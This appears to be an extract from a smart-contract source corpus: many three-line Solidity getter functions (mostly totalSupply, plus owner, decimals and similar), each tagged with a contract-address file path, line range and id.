<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="372" endline="374" pcid="7905">
  function decimals() external view returns (uint8) {
    return _decimals;
  }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="596" endline="598" pcid="4561">
    function getInClaim() public view returns (bool) {
        return inClaim;
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="60" endline="62" pcid="3617">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="55" endline="57" pcid="2371">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="58" endline="60" pcid="1911">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="58" endline="60" pcid="7588">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="55" endline="57" pcid="7786">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="54" endline="56" pcid="3983">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="55" endline="57" pcid="137">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="54" endline="56" pcid="8316">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="55" endline="57" pcid="5074">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="53" endline="55" pcid="2507">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xA9c3D3fB7C16334230E696d07DB378FcE2F0Aa38.sol" startline="39" endline="41" pcid="6176">
    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="470" endline="472" pcid="4535">
    function getBrigdeBuyTokenFromBSCAddress() public view returns (address) {
        return _brigdeBuyTokenFromBSC;
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="297" endline="299" pcid="9093">
  function owner() public view returns (address) {
    return _owner;
  }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="57" endline="59" pcid="5249">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="56" endline="58" pcid="6361">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="52" endline="54" pcid="4999">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="54" endline="56" pcid="2819">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="128" endline="130" pcid="3935">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="57" endline="59" pcid="856">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="54" endline="56" pcid="93">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x705418103a3623918d0f718465dacbfd4c30df74.sol" startline="39" endline="41" pcid="4117">
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="60" endline="62" pcid="8466">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="55" endline="57" pcid="3468">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="55" endline="57" pcid="2670">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="59" endline="61" pcid="7231">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="405" endline="407" pcid="7015">
  function decimals() external view returns (uint8) {
    return _decimals;
  }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="54" endline="56" pcid="1143">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="56" endline="58" pcid="8421">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="58" endline="60" pcid="4929">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="674" endline="676" pcid="6822">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="57" endline="59" pcid="1946">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="371" endline="373" pcid="9098">
  function decimals() external view returns (uint8) {
    return _decimals;
  }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="56" endline="58" pcid="4724">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="57" endline="59" pcid="5780">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="58" endline="60" pcid="4207">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="57" endline="59" pcid="4074">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="54" endline="56" pcid="7816">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="57" endline="59" pcid="3175">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="55" endline="57" pcid="5014">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="59" endline="61" pcid="3998">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="58" endline="60" pcid="2092">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="58" endline="60" pcid="7971">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="58" endline="60" pcid="1382">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xb52eed206d875da99c5ef11d934e999494da4b97.sol" startline="16" endline="16" pcid="6589">
  function getOwner() public view returns (address) { return owner; }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="629" endline="631" pcid="8130">
    function paused() public view returns (bool) {
        return _paused;
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="54" endline="56" pcid="4058">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="58" endline="60" pcid="7439">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe3294e522f9307592da7c9b290409772c6f89e5a.sol" startline="61" endline="63" pcid="8195">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="53" endline="55" pcid="7740">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="57" endline="59" pcid="4965">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="56" endline="58" pcid="7454">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="54" endline="56" pcid="5761">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="53" endline="55" pcid="2685">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="674" endline="676" pcid="8073">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="55" endline="57" pcid="8893">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="56" endline="58" pcid="3546">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="54" endline="56" pcid="8481">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="53" endline="55" pcid="8001">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="334" endline="336" pcid="7761">
  function owner() public view returns (address) {
    return _owner;
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="298" endline="300" pcid="7900">
  function owner() public view returns (address) {
    return _owner;
  }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="56" endline="58" pcid="2782">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="54" endline="56" pcid="1017">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="56" endline="58" pcid="545">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="130" endline="132" pcid="1090">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="271" endline="273" pcid="2596">
    function getOwner() external constant returns (address) {
        return owner;
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="59" endline="61" pcid="727">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="54" endline="56" pcid="5385">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x56cf70eb52d13938b15a850ea6400113478c1015.sol" startline="40" endline="42" pcid="3261">
    function totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="93" endline="95" pcid="4517">
    function owner() public view returns (address) {
        return _owner;
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="49" endline="51" pcid="2297">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x8b49740b4c824252dc4b543c746eae0549c22a15.sol" startline="35" endline="37" pcid="5154">
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="54" endline="56" pcid="6261">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="56" endline="58" pcid="3968">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="54" endline="56" pcid="6745">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="57" endline="59" pcid="5264">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="57" endline="59" pcid="7186">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="57" endline="59" pcid="2181">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="298" endline="300" pcid="5801">
  function owner() public view returns (address) {
    return _owner;
  }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="58" endline="60" pcid="7380">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="58" endline="60" pcid="3756">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="56" endline="58" pcid="4013">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="54" endline="56" pcid="6132">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="53" endline="55" pcid="6479">
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="53" endline="55" pcid="5330">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="600" endline="602" pcid="4562">
    function getInStake() public view returns (bool) {
        return inStake;
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="57" endline="59" pcid="9040">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="57" endline="59" pcid="6760">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="58" endline="60" pcid="2909">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="56" endline="58" pcid="712">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="59" endline="61" pcid="8719">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="271" endline="273" pcid="8933">
    function getOwner() external constant returns (address) {
        return owner;
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="59" endline="61" pcid="4267">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x65D6C1d6d01CBB5D5f010e89E4eC6f3AFccB2C3a.sol" startline="39" endline="41" pcid="3831">
    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="54" endline="56" pcid="1961">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="1018" endline="1020" pcid="1726">
  function processor() public view returns (IProcessor) {
    return _processor;
  }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="55" endline="57" pcid="8831">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xA62Fc0BA9Deeee9336511741c2Dfc4F5b00E128B.sol" startline="97" endline="99" pcid="6058">
    function get_total_credit() external view returns (uint256) {
        return total_credit;
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="58" endline="60" pcid="3423">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="55" endline="57" pcid="5922">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="57" endline="59" pcid="6086">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="58" endline="60" pcid="187">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="608" endline="610" pcid="4564">
    function getToken() public view returns (IERC20) {
        return token;
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="56" endline="58" pcid="415">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="58" endline="60" pcid="871">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="52" endline="54" pcid="5029">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="57" endline="59" pcid="3235">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="298" endline="300" pcid="6397">
  function owner() public view returns (address) {
    return _owner;
  }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="59" endline="61" pcid="8406">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="130" endline="132" pcid="4500">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="56" endline="58" pcid="8622">
    function owner() public view returns (address) {
        return _owner;
    }
</source>
<source file="systems/source-code/0xb52eed206d875da99c5ef11d934e999494da4b97.sol" startline="18" endline="18" pcid="6591">
  function getFee() public view returns (uint256) { return fee; }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="57" endline="59" pcid="2264">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="58" endline="60" pcid="6563">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="57" endline="59" pcid="304">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe0292d64ff7319abd8083e2bdae5ba81a56ada05.sol" startline="41" endline="43" pcid="8044">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="52" endline="54" pcid="4884">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="51" endline="53" pcid="2230">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="54" endline="56" pcid="7832">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="52" endline="54" pcid="1896">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="58" endline="60" pcid="5445">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="55" endline="57" pcid="7695">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="54" endline="56" pcid="923">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="38" endline="40" pcid="3848">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="52" endline="54" pcid="4360">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="58" endline="60" pcid="5557">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa1754e6c03f9e03b36f416a585df4357247c2a83.sol" startline="40" endline="42" pcid="5838">
    function totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="55" endline="57" pcid="6032">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="56" endline="58" pcid="1412">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="58" endline="60" pcid="1397">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x5ba66281ec78ee1a83e7a449d1692b0fda7023e2.sol" startline="43" endline="45" pcid="3496">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="54" endline="56" pcid="5400">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xdd00d90da87417666afcad99eb90378993f937f7.sol" startline="14" endline="14" pcid="7843">
  function getOwner() public view returns (address) { return owner; }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="55" endline="57" pcid="3923">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="57" endline="59" pcid="3205">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="279" endline="281" pcid="752">
    function getOwner() external constant returns (address) {
        return owner;
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="56" endline="58" pcid="3709">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="57" endline="59" pcid="1291">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="58" endline="60" pcid="6967">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="58" endline="60" pcid="3561">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xccf8340c9f6534f4e3e791cd8d9eb8a818754fdc.sol" startline="17" endline="19" pcid="7288">
    function retrieve() public view returns (uint256){
        return number;
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="69" endline="71" pcid="6483">
    function owner() public view returns (address) {
        return _owner;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="39" endline="41" pcid="6436">
    function owner() public view returns (address) {
        return _owner;
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="59" endline="61" pcid="6714">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="56" endline="58" pcid="2537">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="54" endline="56" pcid="6017">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="57" endline="59" pcid="5937">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="56" endline="58" pcid="6147">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="56" endline="58" pcid="9156">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
